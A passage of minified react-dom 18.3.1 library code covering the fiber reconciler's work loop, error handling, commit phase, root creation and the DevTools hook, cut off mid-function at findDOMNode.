function pr(e) {
    Nn !== null && Nn.tag === 0 && !(J & 6) && Qr();
    var t = J;
    J |= 1;
    var n = it.transition,
        r = te;
    try {
        if (((it.transition = null), (te = 1), e)) return e();
    } finally {
        (te = r), (it.transition = n), (J = t), !(J & 6) && Wn();
    }
}
function xu() {
    (Qe = Ur.current), ae(Ur);
}
function ir(e, t) {
    (e.finishedWork = null), (e.finishedLanes = 0);
    var n = e.timeoutHandle;
    if ((n !== -1 && ((e.timeoutHandle = -1), c1(n)), ve !== null))
        for (n = ve.return; n !== null; ) {
            var r = n;
            switch ((Jc(r), r.tag)) {
                case 1:
                    (r = r.type.childContextTypes), r != null && Ri();
                    break;
                case 3:
                    co(), ae(Be), ae(_e), lu();
                    break;
                case 5:
                    au(r);
                    break;
                case 4:
                    co();
                    break;
                case 13:
                    ae(ue);
                    break;
                case 19:
                    ae(ue);
                    break;
                case 10:
                    ru(r.type._context);
                    break;
                case 22:
                case 23:
                    xu();
            }
            n = n.return;
        }
    if (
        ((Ce = e),
        (ve = e = On(e.current, null)),
        (Ne = Qe = t),
        (be = 0),
        (ms = null),
        (gu = pa = dr = 0),
        ($e = Go = null),
        Zn !== null)
    ) {
        for (t = 0; t < Zn.length; t++)
            if (((n = Zn[t]), (r = n.interleaved), r !== null)) {
                n.interleaved = null;
                var o = r.next,
                    s = n.pending;
                if (s !== null) {
                    var i = s.next;
                    (s.next = o), (r.next = i);
                }
                n.pending = r;
            }
        Zn = null;
    }
    return e;
}
function mh(e, t) {
    do {
        var n = ve;
        try {
            if ((nu(), (pi.current = Fi), zi)) {
                for (var r = de.memoizedState; r !== null; ) {
                    var o = r.queue;
                    o !== null && (o.pending = null), (r = r.next);
                }
                zi = !1;
            }
            if (
                ((ur = 0),
                (ke = we = de = null),
                (Ko = !1),
                (ds = 0),
                (hu.current = null),
                n === null || n.return === null)
            ) {
                (be = 1), (ms = t), (ve = null);
                break;
            }
            e: {
                var s = e,
                    i = n.return,
                    a = n,
                    l = t;
                if (((t = Ne), (a.flags |= 32768), l !== null && typeof l == "object" && typeof l.then == "function")) {
                    var u = l,
                        d = a,
                        p = d.tag;
                    if (!(d.mode & 1) && (p === 0 || p === 11 || p === 15)) {
                        var m = d.alternate;
                        m
                            ? ((d.updateQueue = m.updateQueue),
                              (d.memoizedState = m.memoizedState),
                              (d.lanes = m.lanes))
                            : ((d.updateQueue = null), (d.memoizedState = null));
                    }
                    var f = Kd(i);
                    if (f !== null) {
                        (f.flags &= -257), Qd(f, i, a, s, t), f.mode & 1 && Wd(s, u, t), (t = f), (l = u);
                        var S = t.updateQueue;
                        if (S === null) {
                            var v = new Set();
                            v.add(l), (t.updateQueue = v);
                        } else S.add(l);
                        break e;
                    } else {
                        if (!(t & 1)) {
                            Wd(s, u, t), wu();
                            break e;
                        }
                        l = Error(R(426));
                    }
                } else if (ce && a.mode & 1) {
                    var w = Kd(i);
                    if (w !== null) {
                        !(w.flags & 65536) && (w.flags |= 256), Qd(w, i, a, s, t), eu(uo(l, a));
                        break e;
                    }
                }
                (s = l = uo(l, a)), be !== 4 && (be = 2), Go === null ? (Go = [s]) : Go.push(s), (s = i);
                do {
                    switch (s.tag) {
                        case 3:
                            (s.flags |= 65536), (t &= -t), (s.lanes |= t);
                            var g = Ym(s, l, t);
                            Fd(s, g);
                            break e;
                        case 1:
                            a = l;
                            var h = s.type,
                                y = s.stateNode;
                            if (
                                !(s.flags & 128) &&
                                (typeof h.getDerivedStateFromError == "function" ||
                                    (y !== null &&
                                        typeof y.componentDidCatch == "function" &&
                                        (_n === null || !_n.has(y))))
                            ) {
                                (s.flags |= 65536), (t &= -t), (s.lanes |= t);
                                var b = Zm(s, a, t);
                                Fd(s, b);
                                break e;
                            }
                    }
                    s = s.return;
                } while (s !== null);
            }
            yh(n);
        } catch (k) {
            (t = k), ve === n && n !== null && (ve = n = n.return);
            continue;
        }
        break;
    } while (!0);
}
function hh() {
    var e = Ui.current;
    return (Ui.current = Fi), e === null ? Fi : e;
}
function wu() {
    (be === 0 || be === 3 || be === 2) && (be = 4),
        Ce === null || (!(dr & 268435455) && !(pa & 268435455)) || xn(Ce, Ne);
}
function Bi(e, t) {
    var n = J;
    J |= 2;
    var r = hh();
    (Ce !== e || Ne !== t) && ((Kt = null), ir(e, t));
    do
        try {
            L1();
            break;
        } catch (o) {
            mh(e, o);
        }
    while (!0);
    if ((nu(), (J = n), (Ui.current = r), ve !== null)) throw Error(R(261));
    return (Ce = null), (Ne = 0), be;
}
function L1() {
    for (; ve !== null; ) gh(ve);
}
function O1() {
    for (; ve !== null && !i0(); ) gh(ve);
}
function gh(e) {
    var t = xh(e.alternate, e, Qe);
    (e.memoizedProps = e.pendingProps), t === null ? yh(e) : (ve = t), (hu.current = null);
}
function yh(e) {
    var t = e;
    do {
        var n = t.alternate;
        if (((e = t.return), t.flags & 32768)) {
            if (((n = T1(n, t)), n !== null)) {
                (n.flags &= 32767), (ve = n);
                return;
            }
            if (e !== null) (e.flags |= 32768), (e.subtreeFlags = 0), (e.deletions = null);
            else {
                (be = 6), (ve = null);
                return;
            }
        } else if (((n = P1(n, t, Qe)), n !== null)) {
            ve = n;
            return;
        }
        if (((t = t.sibling), t !== null)) {
            ve = t;
            return;
        }
        ve = t = e;
    } while (t !== null);
    be === 0 && (be = 5);
}
function Xn(e, t, n) {
    var r = te,
        o = it.transition;
    try {
        (it.transition = null), (te = 1), I1(e, t, n, r);
    } finally {
        (it.transition = o), (te = r);
    }
    return null;
}
function I1(e, t, n, r) {
    do Qr();
    while (Nn !== null);
    if (J & 6) throw Error(R(327));
    n = e.finishedWork;
    var o = e.finishedLanes;
    if (n === null) return null;
    if (((e.finishedWork = null), (e.finishedLanes = 0), n === e.current)) throw Error(R(177));
    (e.callbackNode = null), (e.callbackPriority = 0);
    var s = n.lanes | n.childLanes;
    if (
        (g0(e, s),
        e === Ce && ((ve = Ce = null), (Ne = 0)),
        (!(n.subtreeFlags & 2064) && !(n.flags & 2064)) ||
            Xs ||
            ((Xs = !0),
            wh(Ci, function () {
                return Qr(), null;
            })),
        (s = (n.flags & 15990) !== 0),
        n.subtreeFlags & 15990 || s)
    ) {
        (s = it.transition), (it.transition = null);
        var i = te;
        te = 1;
        var a = J;
        (J |= 4),
            (hu.current = null),
            R1(e, n),
            dh(n, e),
            n1($l),
            (Ni = !!Ul),
            ($l = Ul = null),
            (e.current = n),
            A1(n),
            a0(),
            (J = a),
            (te = i),
            (it.transition = s);
    } else e.current = n;
    if (
        (Xs && ((Xs = !1), (Nn = e), (Hi = o)),
        (s = e.pendingLanes),
        s === 0 && (_n = null),
        u0(n.stateNode),
        We(e, ye()),
        t !== null)
    )
        for (r = e.onRecoverableError, n = 0; n < t.length; n++)
            (o = t[n]), r(o.value, { componentStack: o.stack, digest: o.digest });
    if ($i) throw (($i = !1), (e = ac), (ac = null), e);
    return (
        Hi & 1 && e.tag !== 0 && Qr(),
        (s = e.pendingLanes),
        s & 1 ? (e === lc ? qo++ : ((qo = 0), (lc = e))) : (qo = 0),
        Wn(),
        null
    );
}
function Qr() {
    if (Nn !== null) {
        var e = Yf(Hi),
            t = it.transition,
            n = te;
        try {
            if (((it.transition = null), (te = 16 > e ? 16 : e), Nn === null)) var r = !1;
            else {
                if (((e = Nn), (Nn = null), (Hi = 0), J & 6)) throw Error(R(331));
                var o = J;
                for (J |= 4, z = e.current; z !== null; ) {
                    var s = z,
                        i = s.child;
                    if (z.flags & 16) {
                        var a = s.deletions;
                        if (a !== null) {
                            for (var l = 0; l < a.length; l++) {
                                var u = a[l];
                                for (z = u; z !== null; ) {
                                    var d = z;
                                    switch (d.tag) {
                                        case 0:
                                        case 11:
                                        case 15:
                                            Qo(8, d, s);
                                    }
                                    var p = d.child;
                                    if (p !== null) (p.return = d), (z = p);
                                    else
                                        for (; z !== null; ) {
                                            d = z;
                                            var m = d.sibling,
                                                f = d.return;
                                            if ((lh(d), d === u)) {
                                                z = null;
                                                break;
                                            }
                                            if (m !== null) {
                                                (m.return = f), (z = m);
                                                break;
                                            }
                                            z = f;
                                        }
                                }
                            }
                            var S = s.alternate;
                            if (S !== null) {
                                var v = S.child;
                                if (v !== null) {
                                    S.child = null;
                                    do {
                                        var w = v.sibling;
                                        (v.sibling = null), (v = w);
                                    } while (v !== null);
                                }
                            }
                            z = s;
                        }
                    }
                    if (s.subtreeFlags & 2064 && i !== null) (i.return = s), (z = i);
                    else
                        e: for (; z !== null; ) {
                            if (((s = z), s.flags & 2048))
                                switch (s.tag) {
                                    case 0:
                                    case 11:
                                    case 15:
                                        Qo(9, s, s.return);
                                }
                            var g = s.sibling;
                            if (g !== null) {
                                (g.return = s.return), (z = g);
                                break e;
                            }
                            z = s.return;
                        }
                }
                var h = e.current;
                for (z = h; z !== null; ) {
                    i = z;
                    var y = i.child;
                    if (i.subtreeFlags & 2064 && y !== null) (y.return = i), (z = y);
                    else
                        e: for (i = h; z !== null; ) {
                            if (((a = z), a.flags & 2048))
                                try {
                                    switch (a.tag) {
                                        case 0:
                                        case 11:
                                        case 15:
                                            da(9, a);
                                    }
                                } catch (k) {
                                    he(a, a.return, k);
                                }
                            if (a === i) {
                                z = null;
                                break e;
                            }
                            var b = a.sibling;
                            if (b !== null) {
                                (b.return = a.return), (z = b);
                                break e;
                            }
                            z = a.return;
                        }
                }
                if (((J = o), Wn(), Dt && typeof Dt.onPostCommitFiberRoot == "function"))
                    try {
                        Dt.onPostCommitFiberRoot(ra, e);
                    } catch {}
                r = !0;
            }
            return r;
        } finally {
            (te = n), (it.transition = t);
        }
    }
    return !1;
}
function ip(e, t, n) {
    (t = uo(n, t)), (t = Ym(e, t, 1)), (e = Mn(e, t, 1)), (t = De()), e !== null && (Cs(e, 1, t), We(e, t));
}
function he(e, t, n) {
    if (e.tag === 3) ip(e, e, n);
    else
        for (; t !== null; ) {
            if (t.tag === 3) {
                ip(t, e, n);
                break;
            } else if (t.tag === 1) {
                var r = t.stateNode;
                if (
                    typeof t.type.getDerivedStateFromError == "function" ||
                    (typeof r.componentDidCatch == "function" && (_n === null || !_n.has(r)))
                ) {
                    (e = uo(n, e)),
                        (e = Zm(t, e, 1)),
                        (t = Mn(t, e, 1)),
                        (e = De()),
                        t !== null && (Cs(t, 1, e), We(t, e));
                    break;
                }
            }
            t = t.return;
        }
}
function D1(e, t, n) {
    var r = e.pingCache;
    r !== null && r.delete(t),
        (t = De()),
        (e.pingedLanes |= e.suspendedLanes & n),
        Ce === e &&
            (Ne & n) === n &&
            (be === 4 || (be === 3 && (Ne & 130023424) === Ne && 500 > ye() - yu) ? ir(e, 0) : (gu |= n)),
        We(e, t);
}
function vh(e, t) {
    t === 0 && (e.mode & 1 ? ((t = Us), (Us <<= 1), !(Us & 130023424) && (Us = 4194304)) : (t = 1));
    var n = De();
    (e = tn(e, t)), e !== null && (Cs(e, t, n), We(e, n));
}
function z1(e) {
    var t = e.memoizedState,
        n = 0;
    t !== null && (n = t.retryLane), vh(e, n);
}
function F1(e, t) {
    var n = 0;
    switch (e.tag) {
        case 13:
            var r = e.stateNode,
                o = e.memoizedState;
            o !== null && (n = o.retryLane);
            break;
        case 19:
            r = e.stateNode;
            break;
        default:
            throw Error(R(314));
    }
    r !== null && r.delete(t), vh(e, n);
}
var xh;
xh = function (e, t, n) {
    if (e !== null)
        if (e.memoizedProps !== t.pendingProps || Be.current) He = !0;
        else {
            if (!(e.lanes & n) && !(t.flags & 128)) return (He = !1), N1(e, t, n);
            He = !!(e.flags & 131072);
        }
    else (He = !1), ce && t.flags & 1048576 && km(t, _i, t.index);
    switch (((t.lanes = 0), t.tag)) {
        case 2:
            var r = t.type;
            mi(e, t), (e = t.pendingProps);
            var o = io(t, _e.current);
            Kr(t, n), (o = uu(null, t, r, e, o, n));
            var s = du();
            return (
                (t.flags |= 1),
                typeof o == "object" && o !== null && typeof o.render == "function" && o.$$typeof === void 0
                    ? ((t.tag = 1),
                      (t.memoizedState = null),
                      (t.updateQueue = null),
                      Ve(r) ? ((s = !0), Ai(t)) : (s = !1),
                      (t.memoizedState = o.state !== null && o.state !== void 0 ? o.state : null),
                      su(t),
                      (o.updater = ua),
                      (t.stateNode = o),
                      (o._reactInternals = t),
                      Xl(t, r, e, n),
                      (t = Jl(null, t, r, !0, s, n)))
                    : ((t.tag = 0), ce && s && Zc(t), Oe(null, t, o, n), (t = t.child)),
                t
            );
        case 16:
            r = t.elementType;
            e: {
                switch (
                    (mi(e, t),
                    (e = t.pendingProps),
                    (o = r._init),
                    (r = o(r._payload)),
                    (t.type = r),
                    (o = t.tag = $1(r)),
                    (e = yt(r, e)),
                    o)
                ) {
                    case 0:
                        t = Zl(null, t, r, e, n);
                        break e;
                    case 1:
                        t = Xd(null, t, r, e, n);
                        break e;
                    case 11:
                        t = Gd(null, t, r, e, n);
                        break e;
                    case 14:
                        t = qd(null, t, r, yt(r.type, e), n);
                        break e;
                }
                throw Error(R(306, r, ""));
            }
            return t;
        case 0:
            return (r = t.type), (o = t.pendingProps), (o = t.elementType === r ? o : yt(r, o)), Zl(e, t, r, o, n);
        case 1:
            return (r = t.type), (o = t.pendingProps), (o = t.elementType === r ? o : yt(r, o)), Xd(e, t, r, o, n);
        case 3:
            e: {
                if ((nh(t), e === null)) throw Error(R(387));
                (r = t.pendingProps), (s = t.memoizedState), (o = s.element), jm(e, t), Ii(t, r, null, n);
                var i = t.memoizedState;
                if (((r = i.element), s.isDehydrated))
                    if (
                        ((s = {
                            element: r,
                            isDehydrated: !1,
                            cache: i.cache,
                            pendingSuspenseBoundaries: i.pendingSuspenseBoundaries,
                            transitions: i.transitions,
                        }),
                        (t.updateQueue.baseState = s),
                        (t.memoizedState = s),
                        t.flags & 256)
                    ) {
                        (o = uo(Error(R(423)), t)), (t = Yd(e, t, r, n, o));
                        break e;
                    } else if (r !== o) {
                        (o = uo(Error(R(424)), t)), (t = Yd(e, t, r, n, o));
                        break e;
                    } else
                        for (
                            qe = An(t.stateNode.containerInfo.firstChild),
                                Xe = t,
                                ce = !0,
                                bt = null,
                                n = Pm(t, null, r, n),
                                t.child = n;
                            n;

                        )
                            (n.flags = (n.flags & -3) | 4096), (n = n.sibling);
                else {
                    if ((ao(), r === o)) {
                        t = nn(e, t, n);
                        break e;
                    }
                    Oe(e, t, r, n);
                }
                t = t.child;
            }
            return t;
        case 5:
            return (
                Rm(t),
                e === null && Ql(t),
                (r = t.type),
                (o = t.pendingProps),
                (s = e !== null ? e.memoizedProps : null),
                (i = o.children),
                Hl(r, o) ? (i = null) : s !== null && Hl(r, s) && (t.flags |= 32),
                th(e, t),
                Oe(e, t, i, n),
                t.child
            );
        case 6:
            return e === null && Ql(t), null;
        case 13:
            return rh(e, t, n);
        case 4:
            return (
                iu(t, t.stateNode.containerInfo),
                (r = t.pendingProps),
                e === null ? (t.child = lo(t, null, r, n)) : Oe(e, t, r, n),
                t.child
            );
        case 11:
            return (r = t.type), (o = t.pendingProps), (o = t.elementType === r ? o : yt(r, o)), Gd(e, t, r, o, n);
        case 7:
            return Oe(e, t, t.pendingProps, n), t.child;
        case 8:
            return Oe(e, t, t.pendingProps.children, n), t.child;
        case 12:
            return Oe(e, t, t.pendingProps.children, n), t.child;
        case 10:
            e: {
                if (
                    ((r = t.type._context),
                    (o = t.pendingProps),
                    (s = t.memoizedProps),
                    (i = o.value),
                    oe(Li, r._currentValue),
                    (r._currentValue = i),
                    s !== null)
                )
                    if (Et(s.value, i)) {
                        if (s.children === o.children && !Be.current) {
                            t = nn(e, t, n);
                            break e;
                        }
                    } else
                        for (s = t.child, s !== null && (s.return = t); s !== null; ) {
                            var a = s.dependencies;
                            if (a !== null) {
                                i = s.child;
                                for (var l = a.firstContext; l !== null; ) {
                                    if (l.context === r) {
                                        if (s.tag === 1) {
                                            (l = Yt(-1, n & -n)), (l.tag = 2);
                                            var u = s.updateQueue;
                                            if (u !== null) {
                                                u = u.shared;
                                                var d = u.pending;
                                                d === null ? (l.next = l) : ((l.next = d.next), (d.next = l)),
                                                    (u.pending = l);
                                            }
                                        }
                                        (s.lanes |= n),
                                            (l = s.alternate),
                                            l !== null && (l.lanes |= n),
                                            Gl(s.return, n, t),
                                            (a.lanes |= n);
                                        break;
                                    }
                                    l = l.next;
                                }
                            } else if (s.tag === 10) i = s.type === t.type ? null : s.child;
                            else if (s.tag === 18) {
                                if (((i = s.return), i === null)) throw Error(R(341));
                                (i.lanes |= n),
                                    (a = i.alternate),
                                    a !== null && (a.lanes |= n),
                                    Gl(i, n, t),
                                    (i = s.sibling);
                            } else i = s.child;
                            if (i !== null) i.return = s;
                            else
                                for (i = s; i !== null; ) {
                                    if (i === t) {
                                        i = null;
                                        break;
                                    }
                                    if (((s = i.sibling), s !== null)) {
                                        (s.return = i.return), (i = s);
                                        break;
                                    }
                                    i = i.return;
                                }
                            s = i;
                        }
                Oe(e, t, o.children, n), (t = t.child);
            }
            return t;
        case 9:
            return (
                (o = t.type),
                (r = t.pendingProps.children),
                Kr(t, n),
                (o = at(o)),
                (r = r(o)),
                (t.flags |= 1),
                Oe(e, t, r, n),
                t.child
            );
        case 14:
            return (r = t.type), (o = yt(r, t.pendingProps)), (o = yt(r.type, o)), qd(e, t, r, o, n);
        case 15:
            return Jm(e, t, t.type, t.pendingProps, n);
        case 17:
            return (
                (r = t.type),
                (o = t.pendingProps),
                (o = t.elementType === r ? o : yt(r, o)),
                mi(e, t),
                (t.tag = 1),
                Ve(r) ? ((e = !0), Ai(t)) : (e = !1),
                Kr(t, n),
                Xm(t, r, o),
                Xl(t, r, o, n),
                Jl(null, t, r, !0, e, n)
            );
        case 19:
            return oh(e, t, n);
        case 22:
            return eh(e, t, n);
    }
    throw Error(R(156, t.tag));
};
function wh(e, t) {
    return Qf(e, t);
}
function U1(e, t, n, r) {
    (this.tag = e),
        (this.key = n),
        (this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null),
        (this.index = 0),
        (this.ref = null),
        (this.pendingProps = t),
        (this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null),
        (this.mode = r),
        (this.subtreeFlags = this.flags = 0),
        (this.deletions = null),
        (this.childLanes = this.lanes = 0),
        (this.alternate = null);
}
function st(e, t, n, r) {
    return new U1(e, t, n, r);
}
function Su(e) {
    return (e = e.prototype), !(!e || !e.isReactComponent);
}
function $1(e) {
    if (typeof e == "function") return Su(e) ? 1 : 0;
    if (e != null) {
        if (((e = e.$$typeof), e === Uc)) return 11;
        if (e === $c) return 14;
    }
    return 2;
}
function On(e, t) {
    var n = e.alternate;
    return (
        n === null
            ? ((n = st(e.tag, t, e.key, e.mode)),
              (n.elementType = e.elementType),
              (n.type = e.type),
              (n.stateNode = e.stateNode),
              (n.alternate = e),
              (e.alternate = n))
            : ((n.pendingProps = t), (n.type = e.type), (n.flags = 0), (n.subtreeFlags = 0), (n.deletions = null)),
        (n.flags = e.flags & 14680064),
        (n.childLanes = e.childLanes),
        (n.lanes = e.lanes),
        (n.child = e.child),
        (n.memoizedProps = e.memoizedProps),
        (n.memoizedState = e.memoizedState),
        (n.updateQueue = e.updateQueue),
        (t = e.dependencies),
        (n.dependencies = t === null ? null : { lanes: t.lanes, firstContext: t.firstContext }),
        (n.sibling = e.sibling),
        (n.index = e.index),
        (n.ref = e.ref),
        n
    );
}
function yi(e, t, n, r, o, s) {
    var i = 2;
    if (((r = e), typeof e == "function")) Su(e) && (i = 1);
    else if (typeof e == "string") i = 5;
    else
        e: switch (e) {
            case Rr:
                return ar(n.children, o, s, t);
            case Fc:
                (i = 8), (o |= 8);
                break;
            case wl:
                return (e = st(12, n, t, o | 2)), (e.elementType = wl), (e.lanes = s), e;
            case Sl:
                return (e = st(13, n, t, o)), (e.elementType = Sl), (e.lanes = s), e;
            case bl:
                return (e = st(19, n, t, o)), (e.elementType = bl), (e.lanes = s), e;
            case Rf:
                return fa(n, o, s, t);
            default:
                if (typeof e == "object" && e !== null)
                    switch (e.$$typeof) {
                        case Tf:
                            i = 10;
                            break e;
                        case jf:
                            i = 9;
                            break e;
                        case Uc:
                            i = 11;
                            break e;
                        case $c:
                            i = 14;
                            break e;
                        case gn:
                            (i = 16), (r = null);
                            break e;
                    }
                throw Error(R(130, e == null ? e : typeof e, ""));
        }
    return (t = st(i, n, t, o)), (t.elementType = e), (t.type = r), (t.lanes = s), t;
}
function ar(e, t, n, r) {
    return (e = st(7, e, r, t)), (e.lanes = n), e;
}
function fa(e, t, n, r) {
    return (e = st(22, e, r, t)), (e.elementType = Rf), (e.lanes = n), (e.stateNode = { isHidden: !1 }), e;
}
function rl(e, t, n) {
    return (e = st(6, e, null, t)), (e.lanes = n), e;
}
function ol(e, t, n) {
    return (
        (t = st(4, e.children !== null ? e.children : [], e.key, t)),
        (t.lanes = n),
        (t.stateNode = { containerInfo: e.containerInfo, pendingChildren: null, implementation: e.implementation }),
        t
    );
}
function H1(e, t, n, r, o) {
    (this.tag = t),
        (this.containerInfo = e),
        (this.finishedWork = this.pingCache = this.current = this.pendingChildren = null),
        (this.timeoutHandle = -1),
        (this.callbackNode = this.pendingContext = this.context = null),
        (this.callbackPriority = 0),
        (this.eventTimes = za(0)),
        (this.expirationTimes = za(-1)),
        (this.entangledLanes =
            this.finishedLanes =
            this.mutableReadLanes =
            this.expiredLanes =
            this.pingedLanes =
            this.suspendedLanes =
            this.pendingLanes =
                0),
        (this.entanglements = za(0)),
        (this.identifierPrefix = r),
        (this.onRecoverableError = o),
        (this.mutableSourceEagerHydrationData = null);
}
function bu(e, t, n, r, o, s, i, a, l) {
    return (
        (e = new H1(e, t, n, a, l)),
        t === 1 ? ((t = 1), s === !0 && (t |= 8)) : (t = 0),
        (s = st(3, null, null, t)),
        (e.current = s),
        (s.stateNode = e),
        (s.memoizedState = {
            element: r,
            isDehydrated: n,
            cache: null,
            transitions: null,
            pendingSuspenseBoundaries: null,
        }),
        su(s),
        e
    );
}
function B1(e, t, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return { $$typeof: jr, key: r == null ? null : "" + r, children: e, containerInfo: t, implementation: n };
}
function Sh(e) {
    if (!e) return zn;
    e = e._reactInternals;
    e: {
        if (gr(e) !== e || e.tag !== 1) throw Error(R(170));
        var t = e;
        do {
            switch (t.tag) {
                case 3:
                    t = t.stateNode.context;
                    break e;
                case 1:
                    if (Ve(t.type)) {
                        t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                        break e;
                    }
            }
            t = t.return;
        } while (t !== null);
        throw Error(R(171));
    }
    if (e.tag === 1) {
        var n = e.type;
        if (Ve(n)) return Sm(e, n, t);
    }
    return t;
}
function bh(e, t, n, r, o, s, i, a, l) {
    return (
        (e = bu(n, r, !0, e, o, s, i, a, l)),
        (e.context = Sh(null)),
        (n = e.current),
        (r = De()),
        (o = Ln(n)),
        (s = Yt(r, o)),
        (s.callback = t ?? null),
        Mn(n, s, o),
        (e.current.lanes = o),
        Cs(e, o, r),
        We(e, r),
        e
    );
}
function ma(e, t, n, r) {
    var o = t.current,
        s = De(),
        i = Ln(o);
    return (
        (n = Sh(n)),
        t.context === null ? (t.context = n) : (t.pendingContext = n),
        (t = Yt(s, i)),
        (t.payload = { element: e }),
        (r = r === void 0 ? null : r),
        r !== null && (t.callback = r),
        (e = Mn(o, t, i)),
        e !== null && (Ct(e, o, i, s), di(e, o, i)),
        i
    );
}
function Vi(e) {
    if (((e = e.current), !e.child)) return null;
    switch (e.child.tag) {
        case 5:
            return e.child.stateNode;
        default:
            return e.child.stateNode;
    }
}
function ap(e, t) {
    if (((e = e.memoizedState), e !== null && e.dehydrated !== null)) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t;
    }
}
function ku(e, t) {
    ap(e, t), (e = e.alternate) && ap(e, t);
}
function V1() {
    return null;
}
var kh =
    typeof reportError == "function"
        ? reportError
        : function (e) {
              console.error(e);
          };
function Cu(e) {
    this._internalRoot = e;
}
ha.prototype.render = Cu.prototype.render = function (e) {
    var t = this._internalRoot;
    if (t === null) throw Error(R(409));
    ma(e, t, null, null);
};
ha.prototype.unmount = Cu.prototype.unmount = function () {
    var e = this._internalRoot;
    if (e !== null) {
        this._internalRoot = null;
        var t = e.containerInfo;
        pr(function () {
            ma(null, e, null, null);
        }),
            (t[en] = null);
    }
};
function ha(e) {
    this._internalRoot = e;
}
ha.prototype.unstable_scheduleHydration = function (e) {
    if (e) {
        var t = em();
        e = { blockedOn: null, target: e, priority: t };
        for (var n = 0; n < vn.length && t !== 0 && t < vn[n].priority; n++);
        vn.splice(n, 0, e), n === 0 && nm(e);
    }
};
function Eu(e) {
    return !(!e || (e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11));
}
function ga(e) {
    return !(
        !e ||
        (e.nodeType !== 1 &&
            e.nodeType !== 9 &&
            e.nodeType !== 11 &&
            (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
    );
}
function lp() {}
function W1(e, t, n, r, o) {
    if (o) {
        if (typeof r == "function") {
            var s = r;
            r = function () {
                var u = Vi(i);
                s.call(u);
            };
        }
        var i = bh(t, r, e, 0, null, !1, !1, "", lp);
        return (e._reactRootContainer = i), (e[en] = i.current), is(e.nodeType === 8 ? e.parentNode : e), pr(), i;
    }
    for (; (o = e.lastChild); ) e.removeChild(o);
    if (typeof r == "function") {
        var a = r;
        r = function () {
            var u = Vi(l);
            a.call(u);
        };
    }
    var l = bu(e, 0, !1, null, null, !1, !1, "", lp);
    return (
        (e._reactRootContainer = l),
        (e[en] = l.current),
        is(e.nodeType === 8 ? e.parentNode : e),
        pr(function () {
            ma(t, l, n, r);
        }),
        l
    );
}
function ya(e, t, n, r, o) {
    var s = n._reactRootContainer;
    if (s) {
        var i = s;
        if (typeof o == "function") {
            var a = o;
            o = function () {
                var l = Vi(i);
                a.call(l);
            };
        }
        ma(t, i, e, o);
    } else i = W1(n, t, e, o, r);
    return Vi(i);
}
Zf = function (e) {
    switch (e.tag) {
        case 3:
            var t = e.stateNode;
            if (t.current.memoizedState.isDehydrated) {
                var n = Fo(t.pendingLanes);
                n !== 0 && (Vc(t, n | 1), We(t, ye()), !(J & 6) && ((po = ye() + 500), Wn()));
            }
            break;
        case 13:
            pr(function () {
                var r = tn(e, 1);
                if (r !== null) {
                    var o = De();
                    Ct(r, e, 1, o);
                }
            }),
                ku(e, 1);
    }
};
Wc = function (e) {
    if (e.tag === 13) {
        var t = tn(e, 134217728);
        if (t !== null) {
            var n = De();
            Ct(t, e, 134217728, n);
        }
        ku(e, 134217728);
    }
};
Jf = function (e) {
    if (e.tag === 13) {
        var t = Ln(e),
            n = tn(e, t);
        if (n !== null) {
            var r = De();
            Ct(n, e, t, r);
        }
        ku(e, t);
    }
};
em = function () {
    return te;
};
tm = function (e, t) {
    var n = te;
    try {
        return (te = e), t();
    } finally {
        te = n;
    }
};
Ml = function (e, t, n) {
    switch (t) {
        case "input":
            if ((El(e, n), (t = n.name), n.type === "radio" && t != null)) {
                for (n = e; n.parentNode; ) n = n.parentNode;
                for (
                    n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0;
                    t < n.length;
                    t++
                ) {
                    var r = n[t];
                    if (r !== e && r.form === e.form) {
                        var o = aa(r);
                        if (!o) throw Error(R(90));
                        Mf(r), El(r, o);
                    }
                }
            }
            break;
        case "textarea":
            Lf(e, n);
            break;
        case "select":
            (t = n.value), t != null && Hr(e, !!n.multiple, t, !1);
    }
};
$f = vu;
Hf = pr;
var K1 = { usingClientEntryPoint: !1, Events: [Ns, Lr, aa, Ff, Uf, vu] },
    _o = { findFiberByHostInstance: Yn, bundleType: 0, version: "18.3.1", rendererPackageName: "react-dom" },
    Q1 = {
        bundleType: _o.bundleType,
        version: _o.version,
        rendererPackageName: _o.rendererPackageName,
        rendererConfig: _o.rendererConfig,
        overrideHookState: null,
        overrideHookStateDeletePath: null,
        overrideHookStateRenamePath: null,
        overrideProps: null,
        overridePropsDeletePath: null,
        overridePropsRenamePath: null,
        setErrorHandler: null,
        setSuspenseHandler: null,
        scheduleUpdate: null,
        currentDispatcherRef: sn.ReactCurrentDispatcher,
        findHostInstanceByFiber: function (e) {
            return (e = Wf(e)), e === null ? null : e.stateNode;
        },
        findFiberByHostInstance: _o.findFiberByHostInstance || V1,
        findHostInstancesForRefresh: null,
        scheduleRefresh: null,
        scheduleRoot: null,
        setRefreshHandler: null,
        getCurrentFiber: null,
        reconcilerVersion: "18.3.1-next-f1338f8080-20240426",
    };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var Ys = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!Ys.isDisabled && Ys.supportsFiber)
        try {
            (ra = Ys.inject(Q1)), (Dt = Ys);
        } catch {}
}
Je.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = K1;
Je.createPortal = function (e, t) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!Eu(t)) throw Error(R(200));
    return B1(e, t, null, n);
};
Je.createRoot = function (e, t) {
    if (!Eu(e)) throw Error(R(299));
    var n = !1,
        r = "",
        o = kh;
    return (
        t != null &&
            (t.unstable_strictMode === !0 && (n = !0),
            t.identifierPrefix !== void 0 && (r = t.identifierPrefix),
            t.onRecoverableError !== void 0 && (o = t.onRecoverableError)),
        (t = bu(e, 1, !1, null, null, n, !1, r, o)),
        (e[en] = t.current),
        is(e.nodeType === 8 ? e.parentNode : e),
        new Cu(t)
    );
};
Je.findDOMNode = function (e) {
    if (e == null) return null;
    if (e.nodeType === 1) return e;
    var t = e._reactInternals;
    if (t === void 0)
